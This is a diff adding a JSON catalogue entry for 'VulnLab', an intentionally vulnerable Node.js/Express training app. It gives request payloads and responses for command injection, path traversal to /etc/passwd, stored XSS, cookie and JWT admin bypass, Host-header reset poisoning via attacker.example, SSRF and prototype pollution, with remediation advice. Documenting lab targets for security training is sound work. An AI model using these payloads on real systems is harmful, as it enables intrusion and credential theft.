@@ -1,5 +1,202 @@
 [
   {
+    "id": "vt-vulnlab",
+    "info": {
+      "name": "VulnLab - Node.js/Express Training App",
+      "author": "omarkurt",
+      "description": "A deliberately vulnerable Node.js/Express application by nospi510 with a single-page\ninterface (in French) that documents each flaw and its payload. It covers OS command\ninjection, local file read, arbitrary file write through upload, IDOR, cookie-based admin\naccess, mass assignment, stored XSS, a JWT signed with a weak secret, blind SSRF, GraphQL\nintrospection, Host header poisoning, prototype pollution and hard-coded secrets. All data\nis kept in memory.\n",
+      "type": "Lab",
+      "difficulty": "Easy",
+      "targets": [
+        "nodejs",
+        "express",
+        "graphql"
+      ],
+      "tags": [
+        "command-injection",
+        "lfi",
+        "file-upload",
+        "idor",
+        "xss",
+        "jwt",
+        "ssrf",
+        "prototype-pollution",
+        "graphql",
+        "nodejs"
+      ],
+      "references": [
+        "https://vulnerabletarget.com/VT-vulnlab",
+        "https://github.com/nospi510/vulnlab"
+      ]
+    },
+    "vulnerabilities": [
+      {
+        "id": "command_injection_ping",
+        "name": "OS command injection in /api/ping",
+        "description": "The host parameter is placed into \"ping -c 1 <host>\" and run with child_process.exec,\nso shell metacharacters run extra commands. No session is needed.\n",
+        "endpoint": "/api/ping",
+        "method": "GET",
+        "param": "host",
+        "request": "GET /api/ping?host=127.0.0.1%3Bid HTTP/1.1\nHost: {{Hostname}}\n",
+        "response": "HTTP/1.1 200 OK\nContent-Type: application/json; charset=utf-8\n\n{\"result\":\"PING 127.0.0.1 ...\\nuid=0(root) gid=0(root) ...\",\"command\":\"ping -c 1 127.0.0.1;id\"}\n"
+      },
+      {
+        "id": "lfi_view",
+        "name": "Local file read through /api/view",
+        "description": "The file parameter is joined to the public directory with path.join and read with\nfs.readFileSync, so ../ sequences read any file the process can open.\n",
+        "endpoint": "/api/view",
+        "method": "GET",
+        "param": "file",
+        "request": "GET /api/view?file=..%2F..%2Fetc%2Fpasswd HTTP/1.1\nHost: {{Hostname}}\n",
+        "response": "HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\n\nroot:x:0:0:root:/root:/bin/sh\n"
+      },
+      {
+        "id": "upload_arbitrary_write",
+        "name": "Arbitrary file write through the upload path",
+        "description": "POST /api/upload stores the file in the directory given by the path query parameter\nand keeps the original file name. The directory is created if it does not exist.\n",
+        "endpoint": "/api/upload",
+        "method": "POST",
+        "param": "path",
+        "request": "POST /api/upload?path=/tmp/vtprobe/ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=vtbnd\n\n--vtbnd\nContent-Disposition: form-data; name=\"file\"; filename=\"vtprobe.txt\"\nContent-Type: text/plain\n\nVT_UPLOAD_PROBE\n--vtbnd--\n",
+        "response": "HTTP/1.1 200 OK\nContent-Type: application/json; charset=utf-8\n\n{\"message\":\"File uploaded\",\"path\":\"/tmp/vtprobe/vtprobe.txt\",\"originalName\":\"vtprobe.txt\",\"size\":15}\n"
+      },
+      {
+        "id": "idor_user_password",
+        "name": "IDOR on /api/user/:id returns the password",
+        "description": "Any user record can be read by id without a session, including the plain-text password.\n",
+        "endpoint": "/api/user/1",
+        "method": "GET",
+        "request": "GET /api/user/1 HTTP/1.1\nHost: {{Hostname}}\n",
+        "response": "HTTP/1.1 200 OK\nContent-Type: application/json; charset=utf-8\n\n{\"id\":1,\"username\":\"admin\",\"password\":\"admin123\",\"role\":\"admin\",\"email\":\"admin@test.com\"}\n"
+      },
+      {
+        "id": "cookie_admin",
+        "name": "Admin access from a client-set cookie",
+        "description": "/api/admin/users only checks the isAdmin cookie. Setting isAdmin=true returns every user\nand password; without it the endpoint answers 403.\n",
+        "endpoint": "/api/admin/users",
+        "method": "GET",
+        "param": "isAdmin",
+        "request": "GET /api/admin/users HTTP/1.1\nHost: {{Hostname}}\nCookie: isAdmin=true\n",
+        "response": "HTTP/1.1 200 OK\nContent-Type: application/json; charset=utf-8\n\n{\"users\":[{\"id\":1,\"username\":\"admin\",\"password\":\"admin123\",...}],\"passwords\":[\"admin123\",\"password\"]}\n"
+      },
+      {
+        "id": "mass_assignment_role",
+        "name": "Mass assignment sets role to admin",
+        "description": "/api/user/update copies the whole request body onto the user picked by the userId\ncookie with Object.assign, so a user can set role to admin.\n",
+        "endpoint": "/api/user/update",
+        "method": "POST",
+        "param": "role",
+        "request": "POST /api/user/update HTTP/1.1\nHost: {{Hostname}}\nCookie: userId=2\nContent-Type: application/json\n\n{\"role\":\"admin\"}\n",
+        "response": "HTTP/1.1 200 OK\nContent-Type: application/json; charset=utf-8\n\n{\"success\":true,\"user\":{\"id\":2,\"username\":\"user\",\"password\":\"password\",\"role\":\"admin\",\"email\":\"user@test.com\"}}\n"
+      },
+      {
+        "id": "stored_xss_posts",
+        "name": "Stored XSS in posts",
+        "description": "Post titles and content are stored as sent and the page inserts them with innerHTML,\nso HTML in a post runs in every visitor's browser.\n",
+        "endpoint": "/api/posts",
+        "method": "POST",
+        "param": "content",
+        "request": "POST /api/posts HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\"title\":\"vt\",\"content\":\"<img src=x onerror=alert(document.domain)>\"}\n",
+        "response": "HTTP/1.1 200 OK\nContent-Type: application/json; charset=utf-8\n\n{\"success\":true,\"post\":{\"id\":3,\"title\":\"vt\",\"content\":\"<img src=x onerror=alert(document.domain)>\",...}}\n"
+      },
+      {
+        "id": "jwt_weak_secret",
+        "name": "JWT signed with a weak hard-coded secret",
+        "description": "Tokens are HS256 JWTs signed with \"secret-key\". Signing {\"role\":\"admin\"} with it unlocks\nthe admin response of /api/admin/jwt-verify.\n",
+        "endpoint": "/api/admin/jwt-verify",
+        "method": "GET",
+        "param": "Authorization",
+        "request": "GET /api/admin/jwt-verify HTTP/1.1\nHost: {{Hostname}}\nAuthorization: Bearer {{jwt_hs256_secret-key_role_admin}}\n",
+        "response": "HTTP/1.1 200 OK\nContent-Type: application/json; charset=utf-8\n\n{\"secret\":\"FLAG{JWT_MASTER_2024}\",\"decoded\":{\"username\":\"x\",\"role\":\"admin\"}}\n"
+      },
+      {
+        "id": "blind_ssrf_fetch",
+        "name": "Blind SSRF in /api/fetch",
+        "description": "The url parameter is fetched by the server without any check. The response body is not\nreturned (the handler fails on response.headers.raw()), but the request is sent, so\ninternal endpoints can be called. The example calls the lab's own cache endpoint, which\nthen reports the key as cached.\n",
+        "endpoint": "/api/fetch",
+        "method": "GET",
+        "param": "url",
+        "request": "GET /api/fetch?url=http%3A%2F%2F127.0.0.1%3A3001%2Fapi%2Fcache%3Fkey%3Dvtssrf HTTP/1.1\nHost: {{Hostname}}\n",
+        "response": "HTTP/1.1 200 OK\nContent-Type: application/json; charset=utf-8\n\n{\"error\":\"response.headers.raw is not a function\",\"url\":\"http://127.0.0.1:3001/api/cache?key=vtssrf\"}\n"
+      },
+      {
+        "id": "graphql_introspection_passwords",
+        "name": "GraphQL introspection and password field",
+        "description": "/graphql has introspection and GraphiQL enabled, and the users query returns every\npassword without authentication.\n",
+        "endpoint": "/graphql",
+        "method": "POST",
+        "request": "POST /graphql HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\"query\":\"{ __schema { types { name } } users { username password } }\"}\n",
+        "response": "HTTP/1.1 200 OK\nContent-Type: application/json; charset=utf-8\n\n{\"data\":{\"__schema\":{...},\"users\":[{\"username\":\"admin\",\"password\":\"admin123\"},...]}}\n"
+      },
+      {
+        "id": "host_header_reset",
+        "name": "Password reset link built from the Host header",
+        "description": "/api/reset-password builds the reset link from the Host header, so an attacker can make\nthe link point to their own host.\n",
+        "endpoint": "/api/reset-password",
+        "method": "POST",
+        "param": "Host",
+        "request": "POST /api/reset-password HTTP/1.1\nHost: attacker.example\nContent-Type: application/json\n\n{\"email\":\"a@b.c\"}\n",
+        "response": "HTTP/1.1 200 OK\nContent-Type: application/json; charset=utf-8\n\n{\"message\":\"Reset email sent\",\"debug\":{\"email\":\"a@b.c\",\"resetLink\":\"http://attacker.example/reset?token=...\",\"host\":\"attacker.example\"},...}\n"
+      },
+      {
+        "id": "config_secrets",
+        "name": "Hard-coded secrets in /api/config",
+        "description": "/api/config returns a database password and API keys without authentication.\n",
+        "endpoint": "/api/config",
+        "method": "GET",
+        "request": "GET /api/config HTTP/1.1\nHost: {{Hostname}}\n",
+        "response": "HTTP/1.1 200 OK\nContent-Type: application/json; charset=utf-8\n\n{\"db_host\":\"localhost\",\"db_user\":\"root\",\"db_pass\":\"SuperSecret123\",\"api_keys\":{...},...}\n"
+      },
+      {
+        "id": "prototype_pollution_merge",
+        "name": "Prototype pollution in /api/merge",
+        "description": "The recursive merge copies a __proto__ key onto Object.prototype. The polluted value is\nthen visible to every object, for example through the cache lookup. This changes global\nstate; restart the container afterwards.\n",
+        "endpoint": "/api/merge",
+        "method": "POST",
+        "param": "settings",
+        "request": "POST /api/merge HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\"settings\":{\"__proto__\":{\"vtpolluted\":\"VT_PP_PROBE\"}}}\n",
+        "response": "HTTP/1.1 200 OK\nContent-Type: application/json; charset=utf-8\n\n{\"result\":{\"user\":{}},\"message\":\"Settings merged\"}\n"
+      },
+      {
+        "id": "unauth_user_delete",
+        "name": "Unauthenticated user delete",
+        "description": "/api/user/delete removes any user by id without a session or CSRF token.\n",
+        "endpoint": "/api/user/delete",
+        "method": "POST",
+        "param": "userId",
+        "request": "POST /api/user/delete HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\"userId\":2}\n",
+        "response": "HTTP/1.1 200 OK\nContent-Type: application/json; charset=utf-8\n\n{\"success\":true,\"message\":\"User 2 deleted\"}\n"
+      }
+    ],
+    "technical": "The whole app is server.js (Express 5) plus public/index.html. Users, posts and the cache\nare in-memory objects.\n\n- /api/ping runs exec(`ping -c 1 ${host}`).\n- /api/view reads path.join(__dirname, 'public', file) with no check for ../.\n- /api/upload uses multer diskStorage with destination req.query.path and the original name.\n- Authorization comes from the userId and isAdmin cookies, which the client sets.\n- JWTs are signed and verified with the constant 'secret-key'.\n- /api/merge copies keys recursively without skipping __proto__.\n\nAdvertised by upstream but not working in this build, so not listed above:\n- The login \"SQL injection\" only prints a SQL string; the check is an array lookup, and\n  admin' -- returns 401.\n- XXE: xml2js does not resolve external entities (\"Invalid character entity\").\n- alg none: jsonwebtoken 9 rejects it (\"jwt signature is required\").\n- SSRF response: the body is never returned (see blind_ssrf_fetch).\n- CORS: the cors package sends Access-Control-Allow-Origin: * with credentials, which\n  browsers refuse for credentialed requests.\n- The \"NoSQL injection\" in the GraphQL search is a plain includes() filter.\n",
+    "impact": "An unauthenticated attacker can run commands as root in the container, read and write any\nfile, read every user's password, become admin by setting a cookie or a JWT, and run script\nin other users' browsers.\n",
+    "remediation": [
+      "Use execFile with an argument list, or validate host as an IP address or hostname",
+      "Resolve file paths and reject any that leave the allowed directory",
+      "Never take the upload directory from the request; generate the stored file name",
+      "Check authorization on the server from a signed session, not from client cookies",
+      "Allow-list the fields a user can update",
+      "Escape output, or use textContent instead of innerHTML",
+      "Use a long random JWT secret from the environment",
+      "Restrict outbound URLs for server-side fetches to an allow-list",
+      "Disable GraphQL introspection and never expose password fields",
+      "Build absolute links from a configured base URL, not the Host header",
+      "Skip __proto__, constructor and prototype keys when merging objects"
+    ],
+    "providers": {
+      "docker-compose": {
+        "path": "docker-compose.yaml"
+      }
+    },
+    "post-install": [
+      "Open http://localhost:3001 (the interface is in French and lists payloads for each flaw)",
+      "Default users: admin / admin123 and user / password",
+      "All data is in memory; restart the container to reset users, posts and prototype pollution"
+    ],
+    "category": "labs",
+    "added_date": "2026-11-06T08:07:34+03:00"
+  },
+  {
     "id": "vt-damnvulnerableapp",
     "info": {
       "name": "Damn Vulnerable App - OAuth Task Manager",
